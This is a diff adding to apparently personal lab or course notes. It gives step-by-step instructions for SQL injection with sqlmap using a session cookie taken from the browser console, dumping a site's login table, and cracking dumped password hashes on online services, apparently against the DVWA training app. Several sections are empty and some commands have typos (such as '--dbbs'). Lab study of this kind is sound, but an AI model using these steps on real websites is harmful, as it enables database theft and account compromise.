@@ -78,4 +78,26 @@
 * tcp.flags.syn == 1 and tcp.flags.ack == 0
 
 # 12 SQL injection PASSWORD
-* 
+* login in website
+* view profile tab and note the url
+* inspect
+* console type (document.cookie)
+* terminal
+* be a root user
+* sqlmap -u "(url)" --cookie="(cookie val)" --dbbs
+* yes for all
+* sqlmap -u "(url)" --cookie="(cookie val)" -D (website name) --tables
+* sqlmap -u "(url)" --cookie="(cookie val)" -D (website name) -T (longin table) --dump
+
+# 13 
+
+# 14
+
+# 15
+
+# 16 HASH,DVWA
+* login with credentials
+* go to file and download
+* open the file coppy hash and paste in hashes.com or crackstation.com
+
+# 17 
